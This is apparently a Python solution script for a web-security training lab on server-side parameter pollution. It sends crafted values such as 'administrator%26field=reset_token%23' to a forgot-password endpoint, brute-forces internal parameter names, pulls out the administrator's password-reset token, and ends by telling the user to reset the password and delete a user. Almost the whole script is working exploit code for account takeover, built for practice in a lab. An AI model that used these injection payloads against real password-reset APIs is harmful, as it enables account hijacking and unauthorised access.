# API testing 24 of 29
# Lab: Exploiting server-side parameter pollution in a query string

import asyncio
from pprint import pprint
from common.base import run_payloads

RAW_REQUEST = """
POST /forgot-password HTTP/2
Host: 0a1300b40385f7478c078abc005f000e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a1300b40385f7478c078abc005f000e.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 60
Origin: https://0a1300b40385f7478c078abc005f000e.web-security-academy.net
Connection: keep-alive
Cookie: session=GaldpgaXtm3g4NziM670z44RuhWnwOSf
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache
TE: trailers

csrf=f314FaY36rpv4LUInMYUyMVYaQvEFqyq&username=@@@PAYLOAD@@@
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] == 200:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    # Original request
    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "administrator")
    print('PLAIN CALL:', end='')
    await print_net_result(raw_req_0, True)

    # It fails (invalid username)
    raw_req_5 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "administratorx")
    print('Wrong username:', end='')
    await print_net_result(raw_req_5, True)


    # It fails (parameter is not supported -> ok, it is retrieving x as a separate parameter)
    raw_req_6 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "administrator%26x=y")
    print('Parameter pollution (x=y):', end='')
    await print_net_result(raw_req_6, True)

    # It fails (field not specified -> ok, it is truncating the query and it wants a "field" parameter)
    raw_req_7 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "administrator%23")
    print('Query truncating (with #):', end='')
    await print_net_result(raw_req_7, True)

    # It fails (invalid field -> ok, it is processing our additional parameter)
    raw_req_8 = RAW_REQUEST.replace("@@@PAYLOAD@@@", "administrator%26field=x%23")
    print('Parameter pollution (field=x) and truncating:', end='')
    await print_net_result(raw_req_8, True)

    print("\nBrute-forcing parameter names (field=...):\n")

    # Server-side variable names payload list
    param_names = ["username", "user", "login", "name", "id", "uid", "user_id", "email"]

    # Try each parameter name in the query string and see if we can get a valid response
    # username and email returns 200, others return 400
    # Using "email", it returns the original response, so it is what we want
    for param in param_names:
        raw_req_9 = RAW_REQUEST.replace("@@@PAYLOAD@@@", f"administrator%26field={param}%23")
        print(f'Parameter pollution (field={param}) and truncating:', end='')
        await print_net_result(raw_req_9, True)

    # Reviewing the /static/js/forgotPassword.js JavaScript file, we can notice the password reset endpoint,
    # which refers to the reset_token parameter: /forgot-password?reset_token=${resetToken}
    # So, we need a reset token?

    raw_req_12 = RAW_REQUEST.replace("@@@PAYLOAD@@@", f"administrator%26field=reset_token%23")
    print(f'Parameter pollution (field=reset_token) and truncating:', end='')
    _, resp = await print_net_result(raw_req_12, True)

    import json
    resp = json.loads(resp)

    if resp:
        reset_token = resp.get("result")
        print(f"Reset token found")
        print(f"With a browser, navigate to /forgot-password?reset_token={reset_token} and reset password, then login with the new password and delete carlos!")

if __name__ == "__main__":
    asyncio.run(main())